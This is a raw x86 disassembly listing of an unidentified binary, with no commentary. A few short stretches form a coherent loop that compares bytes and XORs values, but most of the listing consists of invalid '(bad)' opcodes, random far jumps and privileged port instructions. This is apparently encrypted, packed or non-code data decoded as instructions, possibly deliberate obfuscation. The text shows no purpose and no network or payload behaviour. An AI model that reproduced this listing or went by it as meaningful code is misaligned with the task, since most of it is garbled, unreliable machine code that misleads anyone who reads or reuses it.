  4080b8:	xor    eax,DWORD PTR [esi+edi*4-0x31]
  4080bc:	(bad)  
  4080bd:	nop
  4080be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080bf:	mov    bl,0x66
  4080c1:	(bad)  
  4080c2:	(bad)  [edi+ebp*8+0x6]
  4080c6:	jns    0x408075
  4080c8:	es test edi,esi
  4080cb:	inc    esp
  4080cc:	mov    ?,WORD PTR [esp+edx*8-0x3ecc5690]
  4080d3:	add    eax,esi
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x18e10175],eax
  4080f8:	aaa    
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x40816e
  408102:	push   edx
  408103:	push   DWORD PTR [edx]
  408105:	mov    ds:0x6c701e31,eax
  40810a:	and    esp,eax
  40810c:	mov    esi,?
  40810e:	(bad)  
  40810f:	fbld   TBYTE PTR [ebx]
  408111:	adc    eax,0x1d4fb087
  408116:	in     eax,dx
  408117:	xor    ebp,edx
  408119:	inc    eax
  40811a:	add    bh,bh
  40811c:	xchg   ecx,eax
  40811d:	push   ds
  40811e:	(bad)  [edx]
  408120:	sub    ah,BYTE PTR [ecx+0x59a6a7c8]
  408126:	out    dx,eax
  408127:	lods   al,BYTE PTR ds:[esi]
  408128:	cmp    eax,DWORD PTR [edx-0x7f0f95a7]
  40812e:	dec    edi
  40812f:	cmp    esp,ebp
  408131:	int    0xde
  408133:	ret    
  408134:	mov    edi,0x428f4f61
  408139:	fsub   DWORD PTR [edi+edi*8+0x61]
  40813d:	out    0xe4,al
  40813f:	pop    edi
  408140:	rcr    DWORD PTR [eax],0x2d
  408143:	sbb    eax,0xb902de6b
  408148:	or     BYTE PTR [edi],ch
  40814a:	into   
  40814b:	retf   
  40814c:	sbb    WORD PTR [ecx+0x6f707fe7],0x5880
  408155:	cmp    eax,0xee3f959e
  40815a:	xchg   edi,eax
  40815b:	lea    ebx,[edx+0x1a]
  40815e:	pop    edi
  40815f:	jbe    0x408176
  408161:	jmp    0xc36d:0x425d2f39
  408168:	cmp    eax,0xf3b87cbe
  40816d:	or     eax,0x669f23c8
  408172:	mov    ebx,0x4fb7fb0e
  408177:	popa   
  408178:	mov    cl,0x7b
  40817a:	xor    eax,0x4bae826b
  40817f:	ins    BYTE PTR es:[edi],dx
  408180:	jge    0x40818f
  408182:	mul    BYTE PTR [edx+esi*8+0x4cb93edc]
  408189:	sub    edi,edx
  40818b:	outs   dx,DWORD PTR ds:[esi]
  40818c:	rol    DWORD PTR [ebx+0x572857da],1
  408192:	leave  
  408193:	into   
  408194:	out    dx,eax
  408195:	dec    ebp
  408196:	pop    ds
  408197:	adc    eax,0xe6e80a17
  40819c:	cs mov ebp,0x1ca87221
  4081a2:	xor    al,0x15
  4081a4:	add    WORD PTR [ecx],si
  4081a7:	lods   eax,DWORD PTR ds:[esi]
  4081a8:	in     al,dx
  4081a9:	sti    
  4081aa:	xchg   edx,eax
  4081ab:	inc    esi
  4081ac:	xchg   ebp,eax
  4081ad:	dec    ecx
  4081ae:	xchg   DWORD PTR [ecx+ecx*2],edi
  4081b1:	inc    ebx
  4081b2:	push   edx
  4081b3:	scas   al,BYTE PTR es:[edi]
  4081b4:	stc    
  4081b5:	pop    esp
  4081b6:	push   esp
  4081b7:	je     0x408188
  4081b9:	sbb    al,0x62
  4081bb:	retf   0xaac6
  4081be:	imul   ecx,DWORD PTR [edx-0x5c],0xbee681c6
  4081c5:	jae    0x40815d
  4081c7:	mov    ebx,0x73158d97
  4081cc:	ret    
  4081cd:	inc    esi
  4081ce:	sub    eax,0x245e2a93
  4081d3:	addr16 mov al,ds:0x7617
  4081d7:	inc    ebp
  4081d8:	rol    BYTE PTR [ebx-0x2a],cl
  4081db:	jp     0x408165
  4081dd:	cmp    DWORD PTR [ebx+0x48],eax
  4081e0:	pop    ds
  4081e1:	xchg   ebp,eax
  4081e2:	pop    edi
  4081e3:	xlat   BYTE PTR ds:[ebx]
  4081e4:	test   BYTE PTR [ebp-0x42793007],0x78
  4081eb:	mov    edx,ss
  4081ed:	out    0xca,eax
  4081ef:	imul   edi,DWORD PTR [edx+0x1a],0xdc2808a3
  4081f6:	mov    ebp,0xe5fa58fe
  4081fb:	in     al,0xad
  4081fd:	ret    0x5780
  408200:	sub    esi,DWORD PTR [edi-0x5d]
  408203:	retf   
  408204:	or     DWORD PTR [edx+esi*8],eax
  408207:	(bad)  
  408208:	and    bl,BYTE PTR [ebx+0x7ba147a3]
  40820e:	push   esi
  40820f:	fnclex 
  408211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408212:	outs   dx,BYTE PTR ds:[esi]
  408213:	jle    0x4081f1
  408215:	push   edi
  408216:	jb     0x408261
  408218:	retf   
  408219:	imul   BYTE PTR [esi-0x676bedb2]
  40821f:	mov    ch,0xb3
  408221:	cmp    ch,BYTE PTR [eax]
  408223:	push   ss
  408224:	mov    al,ds:0x9b52c9aa
  408229:	jl     0x40825d
  40822b:	aam    0x6f
  40822d:	cmp    ch,dl
  40822f:	adc    ecx,edx
  408231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408232:	or     BYTE PTR ds:[edi+0x6ac8be2a],bl
  408239:	dec    edi
  40823a:	mov    ch,0xb4
  40823c:	clc    
  40823d:	cmp    al,0x11
  40823f:	sar    BYTE PTR [ebx-0x7a],cl
  408242:	push   0x2d
  408244:	inc    esp
  408245:	add    al,0x9a
  408247:	cwde   
  408248:	xchg   esp,eax
  408249:	mov    eax,ds:0xaff2cf39
  40824e:	mov    al,ds:0x2c396084
  408254:	adc    BYTE PTR [ebx],bh
  408256:	push   esp
  408257:	mov    al,ds:0x5c67e6cc
  40825c:	(bad)  
  40825d:	int    0xf1
  40825f:	xor    eax,0xe8024d93
  408264:	fisttp DWORD PTR [esi+ebp*8+0x15]
  408268:	test   al,0x18
  40826a:	loope  0x4082ab
  40826c:	push   eax
  40826d:	sub    eax,0x17a1f266
  408272:	xchg   edi,eax
  408273:	in     eax,0x35
  408275:	mov    esi,esp
  408277:	(bad)
  40827a:	inc    eax
  40827b:	(bad)  
  40827d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40827e:	mov    edi,0x79f30a2e
  408283:	std    
  408284:	imul   ecx,DWORD PTR [ecx],0x79
  408287:	adc    DWORD PTR [ebx],0x3b
  40828a:	shl    eax,0x4b
  40828d:	imul   esi,DWORD PTR [esi],0xffffffce
  408290:	jbe    0x40827b
  408292:	cmp    DWORD PTR [edi-0x5f13018e],esi
  408298:	imul   esi,DWORD PTR [edi+0x770e351e],0xecbcf232
  4082a2:	iret   
  4082a3:	mov    ebp,0x4832c2f2
  4082a8:	xchg   ebp,eax
  4082a9:	shr    DWORD PTR [ebp+0x1c],cl
  4082ac:	lahf   
  4082ad:	pop    ebp
  4082ae:	xchg   ecx,eax
  4082af:	mov    BYTE PTR [eax],ch
  4082b1:	mov    ds:0x30999bd6,al
  4082b6:	neg    DWORD PTR ds:0x502a12a
  4082bc:	pop    ebx
  4082bd:	mov    ebx,0x549b9fa
  4082c2:	dec    ecx
  4082c3:	test   DWORD PTR [edi-0x3145392d],eax
  4082c9:	pop    esp
  4082ca:	repz out dx,al
  4082cc:	mov    ds:0x41b6d53d,al
  4082d1:	ins    BYTE PTR es:[edi],dx
  4082d2:	(bad)  
  4082d3:	hlt    
  4082d4:	xlat   BYTE PTR ds:[ebx]
  4082d5:	cmc    
  4082d6:	dec    eax
  4082d7:	or     DWORD PTR [eax-0x2c8b0280],ecx
  4082dd:	cwde   
  4082de:	outs   dx,BYTE PTR ds:[esi]
  4082df:	dec    ebp
  4082e0:	mov    es,WORD PTR [ebp-0x44]
  4082e3:	jge    0x40828f
  4082e5:	out    dx,al
  4082e6:	rol    DWORD PTR [ebx],1
  4082e8:	mov    esi,0xefc25263
  4082ed:	mov    WORD PTR [ecx-0x7b],ds
  4082f0:	test   esp,ebp
  4082f2:	adc    BYTE PTR [eax],dl
  4082f4:	les    ecx,FWORD PTR [esi]
  4082f6:	scas   eax,DWORD PTR es:[edi]
  4082f7:	mov    dh,0x35
  4082f9:	mov    bl,0xdb
  4082fb:	mov    WORD PTR [edx+0xc],?
  4082fe:	pop    esp
  4082ff:	sub    al,0x47
  408301:	outs   dx,BYTE PTR ds:[esi]
  408302:	xor    eax,0xfc734adc
  408307:	les    esi,FWORD PTR [esi]
  408309:	aad    0xdf
  40830b:	das    
  40830c:	repz in eax,0xca
  40830f:	lods   al,BYTE PTR ds:[esi]
  408310:	push   eax
  408311:	shr    BYTE PTR [ecx+ebx*1-0x46],0x7f
  408316:	dec    eax
  408317:	std    
  408318:	rcl    cl,0x36
  40831b:	outs   dx,DWORD PTR ds:[esi]
  40831c:	cmp    bl,BYTE PTR [ebx]
  40831e:	and    BYTE PTR [eax-0x5e024100],cl
  408324:	sbb    esp,edi
  408326:	cmp    eax,0xc29dc953
  40832b:	dec    DWORD PTR [ebp+esi*4-0x15]
  40832f:	test   BYTE PTR [ecx+0x4b],dh
  408332:	sbb    DWORD PTR [esi+eiz*1],esi
  408335:	or     esp,ecx
  408337:	xlat   BYTE PTR ds:[ebx]
  408338:	lods   eax,DWORD PTR ds:[esi]
  408339:	push   ebx
  40833a:	imul   esi
  40833c:	in     eax,0xfb
  40833e:	rol    ecx,1
  408340:	sahf   
  408341:	mov    WORD PTR [edi+0x2d372102],cs
  408347:	sbb    al,0x17
  408349:	or     ecx,DWORD PTR [ebp-0x5b89b9e1]
  40834f:	(bad)  
  408350:	out    dx,eax
  408351:	cmp    al,0x2b
  408353:	add    ebx,DWORD PTR [ecx]
  408355:	add    BYTE PTR [edx+0x2d266f63],bh
  40835b:	xchg   ebp,eax
  40835c:	cli    
  40835d:	pop    ds
  40835e:	retf   
  40835f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408360:	and    DWORD PTR [ebx+edx*2-0x296ccfca],esi
  408367:	stos   BYTE PTR es:[edi],al
  408368:	mov    dl,0x10
  40836a:	sahf   
  40836b:	dec    ecx
  40836c:	or     ch,dl
  40836e:	repz sub bl,ah
  408371:	sbb    DWORD PTR [edi-0x7f4b7093],ebp
  408377:	push   esi
  408378:	xchg   esi,eax
  408379:	push   esi
  40837a:	int3   
  40837b:	pop    esi
  40837c:	mov    eax,ds:0x11f44581
  408381:	fidivr DWORD PTR [ecx-0x68a87de6]
  408387:	loop   0x4083e1
  408389:	in     al,0x39
  40838b:	mov    edx,0xdcd700cf
  408390:	jbe    0x4083fb
  408392:	adc    al,0x62
  408394:	jmp    0xe992:0xfcae9872
  40839b:	add    dh,al
  40839d:	fld    TBYTE PTR [edx]
  40839f:	and    al,0xeb
  4083a1:	jl     0x408349
  4083a3:	daa    
  4083a4:	sub    eax,0x57fbc463
  4083a9:	retf   0x62e0
  4083ac:	call   0x2f8c50b3
  4083b1:	stos   WORD PTR es:[edi],ax
  4083b3:	arpl   bp,cx
  4083b5:	fimul  DWORD PTR [eax-0x18]
  4083b8:	test   BYTE PTR [edx],dl
  4083ba:	jbe    0x4083e0
  4083bc:	test   cl,ah
  4083be:	iret   
  4083bf:	or     edi,ebp
  4083c1:	stc    
  4083c2:	sahf   
  4083c3:	loop   0x40839c
  4083c5:	sub    eax,0x69a59cb9
  4083ca:	or     BYTE PTR [edx+0x71],0xc3
  4083ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083cf:	test   eax,0x21ac76ed
  4083d4:	and    cl,ch
  4083d6:	xchg   ebp,eax
  4083d7:	xor    al,0xac
  4083d9:	data16 loope 0x40841b
  4083dc:	adc    BYTE PTR [ebx-0x56],dh
  4083df:	int3   
  4083e0:	push   edi
  4083e1:	scas   eax,DWORD PTR es:[edi]
  4083e2:	xchg   BYTE PTR [ebx],al
  4083e4:	inc    ebx
  4083e5:	xor    eax,esp
  4083e7:	adc    eax,0xbeeeae54
  4083ec:	pop    es
  4083ed:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0xc7498b2],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x408457
  408448:	fs pushf 
  40844a:	ret    
  40844b:	adc    eax,0x954646b7
  408450:	enter  0x3d38,0x44
  408454:	push   0x69
  408456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408457:	cwde   
  408458:	cli    
  408459:	adc    eax,0xe090c8a9
  40845e:	sub    DWORD PTR [ebx-0x6602fe10],edi
  408464:	fldenv [eax+0x3d]
  408467:	jmp    0x15603605
  40846c:	jnp    0x40847f
  40846e:	fmul   DWORD PTR [esi+0x18]
  408471:	xchg   edx,eax
  408472:	loopne 0x40840d
  408474:	xor    DWORD PTR [ebp-0x2d781048],eax
  40847a:	and    ah,BYTE PTR [eax-0x47]
  40847d:	imul   edi,DWORD PTR [edi+0x17],0x749cbc69
  408484:	cwde   
  408485:	dec    edx
  408486:	sti    
  408487:	addr16 dec esp
  408489:	push   ecx
  40848a:	xchg   al,bh
  40848c:	jns    0x40842b
  40848e:	cmp    BYTE PTR [ecx+ecx*4],dh
  408491:	imul   esi,DWORD PTR [edi+0x63],0x2633cc2f
  408498:	js     0x4084d2
  40849a:	push   edi
  40849b:	mov    bh,0x65
  40849d:	push   0x738a73b1
  4084a2:	pop    ss
  4084a3:	out    dx,al
  4084a4:	adc    DWORD PTR [esi+0x34c94b14],0x51
  4084ab:	or     DWORD PTR [ebx+0x35],0x69
  4084af:	cwde   
  4084b0:	paddw  mm6,mm1
  4084b3:	les    esi,FWORD PTR [ebp+0x17]
  4084b6:	sub    ebx,DWORD PTR [esi+0x43]
  4084b9:	rep lods eax,DWORD PTR ds:[esi]
  4084bb:	add    esp,DWORD PTR [eax-0x68]
  4084be:	popa   
  4084bf:	mov    edx,0xc1a77a38
  4084c4:	xor    DWORD PTR [eax+0x2c488549],ebx
  4084ca:	mov    eax,ds:0xd59ef478
  4084cf:	hlt    
  4084d0:	push   ds
  4084d1:	jp     0x408517
  4084d3:	int    0x56
  4084d5:	mov    ah,BYTE PTR [edi+0xb]
  4084d8:	fwait
  4084d9:	pushf  
  4084da:	pushf  
  4084db:	loopne 0x40854c
  4084dd:	mov    ch,0x83
  4084df:	out    0xd3,eax
  4084e1:	pop    ebp
  4084e2:	(bad)  [ecx-0x4b]
  4084e5:	pop    eax
  4084e6:	mov    eax,ds:0x3770b142
  4084eb:	mov    esi,es
  4084ed:	in     eax,0x1f
  4084ef:	mov    ds:0x99b7353e,eax
  4084f4:	mov    ?,WORD PTR [eax-0x6c6f891a]
  4084fa:	out    0xea,eax
  4084fc:	pop    es
  4084fd:	xor    BYTE PTR [ecx],bl
  4084ff:	call   0x2c40:0xfdb86115
  408506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408507:	ins    BYTE PTR es:[edi],dx
  408508:	lods   eax,DWORD PTR ds:[esi]
  408509:	into   
  40850a:	xor    BYTE PTR [eax-0xe],ch
  40850d:	js     0x408571
  40850f:	cmp    ch,BYTE PTR [eax]
  408511:	outs   dx,BYTE PTR ds:[esi]
  408512:	cwde   
  408513:	(bad)  [edx+0x14]
  408516:	adc    DWORD PTR [ebp+0x418020d5],ecx
  40851c:	mov    WORD PTR [esi-0x40a2cd21],ds
  408522:	fdivr  DWORD PTR [esi-0x5d]
  408525:	pop    edi
  408526:	ins    BYTE PTR es:[edi],dx
  408527:	mov    ah,0xed
  408529:	jmp    0xa88ed3a6
  40852e:	jge    0x25ee9c5e
  408534:	cdq    
  408535:	pop    ebp
  408536:	mov    edi,0xb71dc8e3
  40853b:	mov    ds:0x5555d4dc,al
  408540:	cmp    edi,DWORD PTR [ebp-0x71660743]
  408546:	test   eax,0x38210bc
  40854b:	jnp    0x4084e1
  40854d:	out    dx,al
  40854e:	and    dh,ch
  408550:	retf   
  408551:	mov    bh,0x69
  408553:	push   ds
  408554:	inc    esi
  408555:	mov    eax,0x5c258437
  40855a:	bound  edx,QWORD PTR [edx+0x61325237]
  408560:	mov    edi,DWORD PTR [esp+ebx*4-0x7da2672a]
  408567:	lods   al,BYTE PTR ds:[esi]
  408568:	clc    
  408569:	mov    WORD PTR [esi],ss
  40856b:	mov    dl,0xe0
  40856d:	addr16 inc edi
  40856f:	call   0x7960369f
  408574:	inc    esp
  408575:	test   edi,0xd3ae6f48
  40857b:	mov    dl,0xf7
  40857d:	pop    esi
  40857e:	mul    BYTE PTR [edx]
  408580:	xor    eax,0x19d1c771
  408585:	clc    
  408586:	xchg   esi,eax
  408587:	pop    ebp
  408588:	push   cs
  408589:	das    
  40858a:	pusha  
  40858b:	cli    
  40858c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858d:	clc    
  40858e:	dec    ebp
  40858f:	mov    ebp,0xc38f65f7
  408594:	dec    ebx
  408595:	mov    ds:0xf4baa7fe,eax
  40859a:	or     al,0xa4
  40859c:	cmp    ebp,0x45888c8d
  4085a2:	xor    al,0xc7
  4085a4:	iret   
  4085a5:	or     DWORD PTR [esi-0x14366755],ebp
  4085ab:	(bad)  
  4085ac:	jmp    0x4085ca
  4085ae:	shl    BYTE PTR [edi+edx*1],cl
  4085b1:	(bad)  
  4085b2:	loopne 0x4085fe
  4085b4:	and    ah,0xbf
  4085b7:	sbb    DWORD PTR [edi+0x27],eax
  4085ba:	jg     0x408590
  4085bc:	(bad)  
  4085bd:	adc    DWORD PTR ds:0x1f8cf92c,edi
  4085c3:	inc    edx
  4085c4:	fimul  WORD PTR [ebp-0x26d42611]
  4085ca:	(bad)  
  4085cb:	ficomp WORD PTR [ecx+0x315e1d6]
  4085d1:	(bad)
  4085d4:	push   ds
  4085d5:	bound  edx,QWORD PTR [ebp+0x49]
  4085d8:	cmp    al,0x86
  4085da:	lea    edx,[esp+eiz*4+0x6878b0aa]
  4085e1:	and    cl,ch
  4085e3:	and    eax,0x340c9526
  4085e8:	and    eax,DWORD PTR [edx]
  4085ea:	push   ebp
  4085eb:	adc    al,0xa9
  4085ed:	dec    ecx
  4085ee:	leave  
  4085ef:	dec    eax
  4085f0:	stos   DWORD PTR es:[edi],eax
  4085f1:	sbb    al,0x37
  4085f3:	mov    ebp,0xd687d327
  4085f8:	shl    DWORD PTR [esi],1
  4085fa:	aaa    
  4085fb:	jno    0x4085fa
  4085fd:	cmp    eax,0x5f3dd578
  408602:	daa    
  408603:	ins    DWORD PTR es:[edi],dx
  408604:	and    DWORD PTR [esp+edi*8],ebp
  408607:	js     0x4085f2
  408609:	ret    
  40860a:	pop    edi
  40860b:	shr    esp,cl
  40860d:	xchg   esi,eax
  40860e:	mov    cl,0x6
  408610:	dec    edi
  408611:	mov    ds:0xba51cc9b,eax
  408616:	mov    edx,DWORD PTR [eax+eiz*1+0x2b831250]
  40861d:	jle    0x40866b
  40861f:	mov    ah,0xec
  408621:	ja     0x408676
  408623:	jmp    0xc5d5:0xb27457cb
  40862a:	test   eax,0x8e66cbfa
  40862f:	sub    DWORD PTR [edx+0x31],0xffffff8d
  408633:	jmp    0x408619
  408635:	pusha  
  408636:	jb     0x4086a7
  408638:	stos   BYTE PTR es:[edi],al
  408639:	fild   WORD PTR [ebx-0x13]
  40863c:	in     eax,dx
  40863d:	fisttp DWORD PTR [edx+0x542812d0]
  408643:	retf   
  408644:	mov    dl,0x3c
  408646:	lods   al,BYTE PTR ds:[esi]
  408647:	adc    BYTE PTR [ebp+0x8],cl
  40864a:	data16 mov BYTE PTR [ebp+0x2e08df3b],ah
  408651:	ret    0xbfda
  408654:	xor    DWORD PTR [esi+0x3ccbe501],ecx
  40865a:	adc    BYTE PTR [esi],dh
  40865c:	call   0xb2a4ce65
  408661:	fimul  DWORD PTR [esi]
  408663:	jmp    0x408691
  408665:	popa   
  408666:	adc    cl,bh
  408668:	or     al,0xdc
  40866a:	lock jmp 0x3f62:0x482422b6
  408672:	or     cl,dl
  408674:	mov    dh,0x2d
  408676:	imul   eax,DWORD PTR [edi+0x4c],0x5f
  40867a:	jmp    0xb765:0x27ac01ad
  408681:	push   esp
  408682:	xchg   BYTE PTR [edx],ah
  408684:	mov    al,ds:0xc25face1
  408689:	aas    
  40868a:	xor    BYTE PTR [ecx],dh
  40868c:	pop    es
  40868d:	xor    DWORD PTR [esi-0x66],ebp
  408690:	inc    eax
  408691:	cld    
  408692:	pop    esp
  408693:	xchg   DWORD PTR [esp+ecx*1+0x96d883d],esi
  40869a:	sbb    al,0xed
  40869c:	fsubr  DWORD PTR [ebp-0x3c]
  40869f:	fwait
  4086a0:	cld    
  4086a1:	or     dl,BYTE PTR [ecx+0x47e021ab]
  4086a7:	pop    ebp
  4086a8:	xor    dl,BYTE PTR [edi+0xb5ebb4f]
  4086ae:	cmp    esp,edi
  4086b0:	adc    eax,0xd750003d
  4086b5:	ins    DWORD PTR es:[edi],dx
  4086b6:	fcmovnbe st,st(1)
  4086b8:	shl    edi,cl
  4086ba:	mov    bh,0x2c
  4086bc:	sbb    eax,0x5e3ef2f1
  4086c1:	mov    cl,BYTE PTR ds:0xfd2df1fc
  4086c7:	in     eax,0xff
  4086c9:	das    
  4086ca:	retf   0x6a74
  4086cd:	jecxz  0x40872c
  4086cf:	ret    
  4086d0:	outs   dx,BYTE PTR ds:[esi]
  4086d1:	fs mov ch,0x74
  4086d4:	or     ebx,DWORD PTR [edx]
  4086d6:	loope  0x40867e
  4086d8:	ins    DWORD PTR es:[edi],dx
  4086d9:	das    
  4086da:	cmp    BYTE PTR [ebx+0x22605c04],bh
  4086e0:	enter  0xb634,0x6c
  4086e4:	jae    0x408743
  4086e6:	sti    
  4086e7:	and    bh,dl
  4086e9:	les    edx,FWORD PTR [esi+0x502148ea]
  4086ef:	in     al,0x2c
  4086f1:	pop    es
  4086f2:	and    ah,ch
  4086f4:	aam    0x4e
  4086f6:	sub    BYTE PTR [ebp+0x65],dh
  4086f9:	xor    ch,BYTE PTR [ebx+0x46f5bc53]
  4086ff:	xchg   ebp,eax
  408700:	sub    al,0x7
  408702:	jae    0x408708
  408704:	or     bl,BYTE PTR [ebp+0x1a11b3ed]
  40870a:	xor    DWORD PTR ds:0x5f45e20a,eax
  408710:	lea    edi,[ebp+0x77]
  408713:	cs std 
  408715:	(bad)  
  408716:	neg    ebx
  408718:	mov    ebx,0x78277c2
  40871d:	xchg   ebx,eax
  40871e:	or     al,0xde
  408720:	in     al,dx
  408721:	sti    
  408722:	stos   DWORD PTR es:[edi],eax
  408723:	stos   BYTE PTR es:[edi],al
  408724:	and    esi,ebx
  408726:	lahf   
  408727:	inc    ecx
  408728:	pop    esi
  408729:	sub    DWORD PTR [esi+0x79ec1736],ebx
  40872f:	mov    DWORD PTR [ecx+0x2],ebx
  408732:	jmp    0x4086c1
  408734:	inc    ebp
  408735:	call   0x8c2cccc3
  40873a:	inc    ebp
  40873b:	in     al,dx
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	out    0x8,eax
  408779:	xor    al,0xa6
  40877b:	int3   
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x40875c
  408784:	shl    BYTE PTR [eax+0x1],0x59
  408788:	loopne 0x408722
  40878a:	and    DWORD PTR [edx-0x47],ebp
  40878d:	or     ch,0x3a
  408790:	or     ch,al
  408792:	sub    DWORD PTR [eax],0x8
  408795:	sbb    eax,0x81aa1ba1
  40879a:	pop    ss
  40879b:	xchg   ebx,eax
  40879c:	push   eax
  40879d:	xchg   ebx,eax
  40879e:	mov    al,ds:0x5ccfc0ee
  4087a3:	inc    ebx
  4087a4:	push   esp
  4087a5:	mov    ebp,0x4a004559
  4087aa:	dec    esp
  4087ab:	je     0x40882b
  4087ad:	in     al,0x70
  4087af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087b0:	inc    edx
  4087b1:	mov    ebx,0x1228b021
  4087b6:	mov    ecx,0xe3e4b26
  4087bb:	ret    0x659b
  4087be:	mov    ebx,0x444cf1a8
  4087c3:	nop
  4087c4:	icebp  
  4087c5:	pop    esi
  4087c6:	test   al,dl
  4087c8:	pop    ebx
  4087c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ca:	in     eax,0x45
  4087cc:	aas    
  4087cd:	fisubr DWORD PTR [ecx+esi*1-0x63a286dc]
  4087d4:	cmp    cl,cl
  4087d6:	or     DWORD PTR [edx],ebx
  4087d8:	xor    eax,0x77a41015
  4087dd:	inc    ebx
  4087de:	push   edx
  4087df:	pop    edi
  4087e0:	jno    0x408804
  4087e2:	mov    edi,0xbe712311
  4087e7:	arpl   bp,sp
  4087e9:	adc    ch,BYTE PTR [edx-0x19]
  4087ec:	pop    ecx
  4087ed:	dec    edi
  4087ee:	dec    ebp
  4087ef:	test   al,0x17
  4087f1:	fdivr  QWORD PTR [edi+0x47]
  4087f4:	pop    esi
  4087f5:	or     eax,0xcbb1a492
  4087fa:	xor    eax,DWORD PTR [ecx+0xb]
  4087fd:	push   edi
  4087fe:	out    dx,al
  4087ff:	jge    0x408813
  408801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408802:	xlat   BYTE PTR ds:[ebx]
  408803:	mov    dh,0xd0
  408805:	cmp    esp,edx
  408807:	mov    ch,0xfd
  408809:	shl    BYTE PTR ds:0xc92679ae,cl
  40880f:	inc    esp
  408810:	add    BYTE PTR [ebp+0x7a],dh
  408813:	and    ebp,DWORD PTR [esi-0x245ffe06]
  408819:	xor    eax,0x4eeeb631
  40881e:	fxch   st(0)
  408820:	xchg   ecx,eax
  408821:	push   0x5
  408823:	mov    eax,ds:0xdfd71b64
  408828:	dec    edx
  408829:	aas    
  40882a:	test   BYTE PTR [eax+0x22cee455],bl
  408830:	xchg   ebp,eax
  408831:	mov    ds:0x2cce46f0,eax
  408836:	inc    ecx
  408837:	outs   dx,DWORD PTR ds:[esi]
  408838:	ja     0x4087d9
  40883a:	add    esi,DWORD PTR ds:0xdfe9f0c2
  408840:	adc    al,0x24
  408842:	sbb    DWORD PTR [edx-0x6d02aadc],esi
  408848:	push   esp
  408849:	jbe    0x40887e
  40884b:	fdiv   QWORD PTR [edi+0x2]
  40884e:	repnz mov esi,0xbff5eeac
  408854:	enter  0xc50d,0xf9
  408858:	aaa    
  408859:	inc    eax
  40885a:	stc    
  40885b:	jge    0x4088cd
  40885d:	xchg   esp,eax
  40885e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885f:	nop
  408860:	sub    BYTE PTR [ebx-0x7121c306],dl
  408866:	lods   al,BYTE PTR ds:[esi]
  408867:	xor    ah,BYTE PTR [ebx+0x59e8ba19]
  40886d:	lea    esi,[ecx-0x7afd8d1c]
  408873:	mov    edx,0x6ca1d94a
  408878:	pop    edi
  408879:	shl    al,0xfe
  40887c:	and    eax,0xe8ebc3a2
  408881:	cwde   
  408882:	cwde   
  408883:	xor    DWORD PTR [ebp-0x5],0xffffffd6
  408887:	sub    esp,DWORD PTR [edi+0x64]
  40888a:	pop    ss
  40888b:	add    DWORD PTR [edi-0x69],eax
  40888e:	and    BYTE PTR [eax],bl
  408890:	mov    DWORD PTR [edi-0xd],ecx
  408893:	add    ecx,DWORD PTR ds:0xa61017ac
  408899:	ror    BYTE PTR [eax+0x5407fb5a],1
  40889f:	outs   dx,BYTE PTR ds:[esi]
  4088a0:	push   0x3f9dfefd
  4088a5:	mov    eax,0x8f2fe2df
  4088aa:	lods   eax,DWORD PTR ds:[esi]
  4088ab:	inc    ecx
  4088ac:	sub    DWORD PTR [esi-0x179a26fc],esi
  4088b2:	cwde   
  4088b3:	test   DWORD PTR ss:[esi+0x2d],esp
